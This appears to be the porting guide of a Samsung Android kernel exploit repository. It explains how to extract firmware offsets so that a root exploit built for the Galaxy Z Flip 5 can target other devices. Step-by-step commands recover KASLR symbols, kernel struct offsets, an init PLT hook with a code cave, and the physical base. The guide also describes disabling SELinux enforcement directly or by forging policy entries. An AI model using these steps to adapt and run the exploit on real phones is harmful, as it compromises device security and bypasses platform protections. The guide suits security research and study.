# Porting to Other Samsung A7xx Devices

This repo is hardcoded for Z Flip 5 (F731NKSU5EYD9, kernel 5.15.153)

To move to another device, replace build specific constants in src/exploit.c

Everything else (GPU R/W, Dirty Pagetable, DEFEX handling, init-hook etc..) is Samsung generic.

All inputs are extracted offline from firmware 

## Quick start (one script)

Put `boot.img`, `kallsyms.txt`, `init` in one folder and run:

```bash
helpers/port_extract.py        # reads boot.img, kallsyms.txt, init in the cwd
```

It prints every `#define` listed below. Needs `python3`, `readelf`, `pahole` (`apt install dwarves`)

How to get the three inputs? Follow below!  

## From firmware 

```bash
# download firmware from https://samfw.com  ->  AP_*.tar.md5   (boot.img + super.img are in AP) 
tar xf AP_*.tar.md5
lz4 -d boot.img.lz4 boot.img
lz4 -d super.img.lz4 super.img

# init  (for the init-hook offsets)
simg2img super.img super.raw && lpunpack super.raw .       # -> system.img
#   pull /system/bin/init out of system.img (mount it, or 7z/debugfs)

# kernel + kallsyms.txt  (the kernel Image lives inside boot.img)
git clone https://github.com/osm0sis/mkbootimg && (cd mkbootimg && gcc -O3 unpackbootimg.c -o unpackbootimg)
./mkbootimg/unpackbootimg -i boot.img -o out/              # -> out/boot.img-kernel (already a raw Image)
gcc cheese-cake/helpers/extract-kallsyms.c -o ek && ./ek out/boot.img-kernel   # -> kallsyms.txt
#   (or: pipx install vmlinux-to-elf ; vmlinux-to-elf out/boot.img-kernel vmlinux ; readelf -sW vmlinux)
```

Then run `helpers/port_extract.py`, or do each group by hand below.

(The script carves the kernel from boot.img itself, so for the manual commands use `out/boot.img-kernel` as `kernel`)

## Extract each offset by hand

### KASLR symbols/signature

- `FW_STEXT_VA` 
- `FW_SWAPPER_PG_DIR_VA` 
- `FW_INIT_TASK_VA` 
- `FW_SELINUX_STATE_VA` 
- `SAMSUNG_LINEAR_MAP_BASE` 
- `SAMSUNG_STEXT_OFFSET` 
- `FW_STEXT_SIG1` 
- `FW_STEXT_SIG2` 
- `expected_words[6]`

```bash
grep -wE '_text|_stext|swapper_pg_dir|init_task|selinux_state' kallsyms.txt   # FW_*_VA + base
xxd -s 0x10000 -l 24 -e -g4 kernel                                      # first 6 words of _stext
```
`expected_words[6]` = those 6 words; `FW_STEXT_SIG1`/`SIG2` = the first two 64-bit words.

`SAMSUNG_LINEAR_MAP_BASE` = `_text` (kernel base); `SAMSUNG_STEXT_OFFSET` = `_stext` − `_text` (usually 0x10000, which is also the signature's file offset in the Image) 

### Struct offsets

- `OFFSETOF_TASK_STRUCT_TASKS`, `_MM`, `_PID` 
- `OFFSETOF_MM_PGD`, `_START_CODE`, `_END_CODE`

The kernel embeds BTF; carve it, then pahole:

```bash
python3 -c "d=open('kernel','rb').read();i=d.find(b'\x9f\xeb\x01\x00');import struct;h,_,_,so,sl=struct.unpack_from('<IIIII',d,i+4);open('kernel.btf','wb').write(d[i:i+h+so+sl])"
pahole -C task_struct kernel.btf   # tasks, mm, pid
pahole -C mm_struct  kernel.btf    # pgd, start_code, end_code
```
Read the decimal offset in each member's `/* offset size */` comment.
(vmlinux-to-elf is NOT enough here.. it only restores symbols, it drops BTF, so pahole gets nothing)

### Init-hook

- `INIT_TEXT_FILE_VA` 
- `INIT_HOOK_PATCH_FILE_VA` 
- `INIT_HOOK_PATCH_EXPECT0..3` 
- `INIT_HOOK_CAVE_FILE_VA` 
- `INIT_HOOK_CAVE_EXPECT0`

```bash
readelf -lW init | grep 'R E'                      # INIT_TEXT_FILE_VA = the LOAD VirtAddr
readelf -rW init | grep __system_property_update   # the @plt GOT slot
```
The PLT stub that loads that slot (`adrp x16` / `ldr x17` / `add x16` / `br x17`) gives
`INIT_HOOK_PATCH_FILE_VA` + `EXPECT0..3`. `INIT_HOOK_CAVE_FILE_VA` = zero padding at the end of
the exec segment (need 248 bytes); `INIT_HOOK_CAVE_EXPECT0` = 0 

### Physical base 

`KERNEL_PHYS_BASE` is `0xA8000000` on SM8550 and most recent Snapdragon, and the binary auto-sweeps
`gPhyAddrs[]`, so usually leave it

## SELinux

This device has `CONFIG_SECURITY_SELINUX_DEVELOP=y`, so run_selinux_rmw() just writes selinux_state.enforcing = 0 after the KASLR leak.

If this option is disabled (e.g. S24 Ultra), that field is absent and the write fails.

In that case, manipulate the policy instead, such as forging an ebitmap node or setting allow_unknown.

```bash
adb shell zcat /proc/config.gz | grep CONFIG_SECURITY_SELINUX_DEVELOP
```

## Build / Run?

See README.md
